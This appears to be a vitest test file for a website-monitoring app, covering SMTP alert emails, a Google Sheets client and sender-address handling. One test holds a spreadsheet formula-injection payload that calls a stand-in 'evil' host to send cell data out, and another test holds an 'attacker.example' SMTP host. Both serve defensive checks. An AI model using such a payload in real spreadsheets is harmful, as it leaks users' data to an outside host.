import { createVerify, generateKeyPairSync } from "node:crypto";
import type { AddressInfo } from "node:net";
import { SMTPServer } from "smtp-server";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { buildDownEmail } from "./email-templates";
import { createMailTransport, effectiveFrom, sendMail } from "./mailer";
import { parseServiceAccount, sheetCell, SheetsClient } from "./sheets";

describe("SMTP (real local server)", () => {
  const received: Array<{ to: string; body: string }> = [];
  let smtp: SMTPServer;
  let port = 0;

  beforeAll(async () => {
    smtp = new SMTPServer({
      authOptional: true,
      disabledCommands: ["STARTTLS"],
      onData(stream, session, cb) {
        let body = "";
        stream.on("data", (c: Buffer) => (body += c.toString()));
        stream.on("end", () => {
          received.push({ to: session.envelope.rcptTo.map((r) => r.address).join(","), body });
          cb();
        });
      },
    });
    await new Promise<void>((r) => smtp.listen(0, "127.0.0.1", () => r()));
    port = (smtp.server.address() as AddressInfo).port;
  });
  afterAll(() => new Promise<void>((r) => smtp.close(() => r())));

  it("sends a DOWN email", async () => {
    const transport = createMailTransport(
      { host: "127.0.0.1", port, security: "NONE", username: "", from: "Monitor <monitor@example.com>" },
      undefined,
    );
    const msg = buildDownEmail({
      incidentId: 142,
      websiteName: "ร้านค้าออนไลน์",
      url: "https://shop.example.com",
      cause: "Timeout",
      startedAt: new Date("2026-10-21T04:19:12Z"),
      confirmedAt: new Date("2026-10-21T04:22:41Z"),
      appBaseUrl: "http://monitor.lan:3000",
      timeZone: "Asia/Bangkok",
    });
    const res = await sendMail(transport, "Monitor <monitor@example.com>", { ...msg, to: "ops@example.com" });
    expect(res.response).toMatch(/^250/);
    expect(received).toHaveLength(1);
    expect(received[0]!.to).toBe("ops@example.com");
    expect(received[0]!.body).toContain("Subject:");
  });
});

describe("Google Sheets client", () => {
  const { privateKey, publicKey } = generateKeyPairSync("rsa", { modulusLength: 2048 });
  const pem = privateKey.export({ type: "pkcs8", format: "pem" }).toString();
  const saJson = JSON.stringify({ client_email: "monitor@proj.iam.gserviceaccount.com", private_key: pem });

  it("กันสูตรใน Sheets: ข้อความที่ขึ้นต้นด้วย = + - @ ใส่ ' นำหน้า · ตัวเลขคงเดิม", () => {
    expect(sheetCell('=IMPORTXML("https://evil/x?"&A2,"//a")')).toBe(
      `'=IMPORTXML("https://evil/x?"&A2,"//a")`,
    );
    expect(sheetCell("+Portal")).toBe("'+Portal");
    expect(sheetCell("-Intranet")).toBe("'-Intranet");
    expect(sheetCell("@user")).toBe("'@user");
    expect(sheetCell("CRM")).toBe("CRM");
    expect(sheetCell(-5)).toBe(-5);
    expect(sheetCell(null)).toBe("");
  });

  it("parses the service account JSON (raw and base64)", () => {
    expect(parseServiceAccount(saJson)?.client_email).toBe("monitor@proj.iam.gserviceaccount.com");
    expect(parseServiceAccount(Buffer.from(saJson).toString("base64"))?.client_email).toBe(
      "monitor@proj.iam.gserviceaccount.com",
    );
    expect(parseServiceAccount("{bad")).toBeNull();
  });

  it("signs a valid RS256 assertion", () => {
    const client = new SheetsClient(parseServiceAccount(saJson)!, "sheet123");
    const [h, c, s] = client.buildAssertion(1_700_000_000).split(".");
    const v = createVerify("RSA-SHA256");
    v.update(`${h}.${c}`);
    expect(v.verify(publicKey, Buffer.from(s!, "base64url"))).toBe(true);
    const claims = JSON.parse(Buffer.from(c!, "base64url").toString());
    expect(claims).toMatchObject({
      iss: "monitor@proj.iam.gserviceaccount.com",
      aud: "https://oauth2.googleapis.com/token",
    });
  });

  it("creates a missing sheet with a header and appends rows", async () => {
    const calls: Array<{ url: string; method: string; body?: string }> = [];
    const fakeFetch = (async (input: string | URL | Request, init?: RequestInit) => {
      const url = String(input);
      calls.push({ url, method: init?.method ?? "GET", body: init?.body ? String(init.body) : undefined });
      const json = (o: unknown) => new Response(JSON.stringify(o), { status: 200 });
      if (url.includes("oauth2")) return json({ access_token: "tok", expires_in: 3600 });
      if (url.includes("fields=sheets")) return json({ sheets: [{ properties: { title: "Other" } }] });
      return json({});
    }) as typeof fetch;
    const client = new SheetsClient(parseServiceAccount(saJson)!, "sheet123", { fetchImpl: fakeFetch });
    await client.ensureSheet("Incidents", ["#", "เว็บไซต์"]);
    const n = await client.append("Incidents", [[142, "ร้านค้าออนไลน์"]]);
    expect(n).toBe(1);
    expect(calls.some((c) => c.url.endsWith(":batchUpdate") && c.body?.includes("addSheet"))).toBe(true);
    const appends = calls.filter((c) => c.url.includes(":append"));
    expect(appends).toHaveLength(2); // header + data
    expect(appends[1]!.body).toContain("ร้านค้าออนไลน์");
  });

  const scripted = (statuses: number[]) => {
    const calls: Array<{ url: string; method: string }> = [];
    let i = 0;
    const fakeFetch = (async (input: string | URL | Request, init?: RequestInit) => {
      const url = String(input);
      if (url.includes("oauth2"))
        return new Response(JSON.stringify({ access_token: "t", expires_in: 3600 }));
      calls.push({ url, method: init?.method ?? "GET" });
      const status = statuses[Math.min(i++, statuses.length - 1)]!;
      return new Response(JSON.stringify({ values: [["Incident #"], [142], [143]] }), { status });
    }) as typeof fetch;
    const client = new SheetsClient(parseServiceAccount(saJson)!, "sheet123", {
      fetchImpl: fakeFetch,
      retryBaseMs: 1,
    });
    return { client, calls };
  };

  it("retries an append rejected with 429 (quota) — the write was not applied", async () => {
    const { client, calls } = scripted([429, 429, 200]);
    await client.append("Incidents", [[1, "x"]]);
    expect(calls).toHaveLength(3);
  });

  it("does not blindly retry an append that failed with 5xx (it may already be written)", async () => {
    const { client, calls } = scripted([503, 200]);
    await expect(client.append("Incidents", [[1, "x"]])).rejects.toThrow("503");
    expect(calls).toHaveLength(1);
  });

  it("reads a key column as strings (for skipping rows already in the sheet)", async () => {
    const { client, calls } = scripted([503, 200]); // อ่านอย่างเดียว → 5xx ลองใหม่ได้
    expect(await client.columnValues("Incidents", "A:A")).toEqual([["Incident #"], ["142"], ["143"]]);
    expect(calls).toHaveLength(2);
    expect(calls[1]!.url).toContain("UNFORMATTED_VALUE");
  });
});

describe("effectiveFrom", () => {
  const base = { host: "smtp-mail.outlook.com", port: 587, security: "STARTTLS" as const, alertEmails: [] };
  it("uses the SMTP username as the address when From is only a display name", () => {
    expect(
      effectiveFrom({ ...base, username: "notify@syntechnology.com", from: "SYNTECH Web Monitor" }),
    ).toBe('"SYNTECH Web Monitor" <notify@syntechnology.com>');
  });
  it("keeps a From that already has an address", () => {
    expect(effectiveFrom({ ...base, username: "notify@a.com", from: "Mon <alerts@a.com>" })).toBe(
      "Mon <alerts@a.com>",
    );
    expect(effectiveFrom({ ...base, username: "x", from: "a@b.com" })).toBe("a@b.com");
  });
  it("leaves From alone when the username is not an email", () => {
    expect(effectiveFrom({ ...base, username: "relayuser", from: "Monitor" })).toBe("Monitor");
  });
});

describe("senderDomain", () => {
  it("takes the domain from the From address (used for Message-ID and EHLO, not localhost)", async () => {
    const { senderDomain } = await import("./mailer");
    expect(senderDomain("SYNTECH Web Monitor <notify@syntechnology.com>")).toBe("syntechnology.com");
    expect(senderDomain("notify@SynTechnology.com")).toBe("syntechnology.com");
    expect(senderDomain("Monitor")).toBeNull();
  });
});

describe("SMTP_ALLOWED_HOST", () => {
  it("only sends the .env password to the allowed SMTP server", async () => {
    const { assertSmtpHostAllowed, createMailTransport } = await import("./mailer");
    expect(() => assertSmtpHostAllowed("smtp.gmail.com", undefined)).not.toThrow(); // ไม่ล็อก
    expect(() =>
      assertSmtpHostAllowed("SMTP.Gmail.com", "smtp.gmail.com, smtp-mail.outlook.com"),
    ).not.toThrow();
    expect(() => assertSmtpHostAllowed("attacker.example", "smtp.gmail.com")).toThrow("SMTP_ALLOWED_HOST");
    const s = {
      host: "attacker.example",
      port: 25,
      security: "NONE" as const,
      username: "x",
      from: "a@b.co",
    };
    expect(() => createMailTransport(s, "secret", { allowedHosts: "smtp.gmail.com" })).toThrow();
    // ไม่มีรหัสผ่าน = ไม่มีอะไรรั่ว → ไม่ต้องล็อก
    expect(() => createMailTransport(s, undefined, { allowedHosts: "smtp.gmail.com" })).not.toThrow();
  });
});
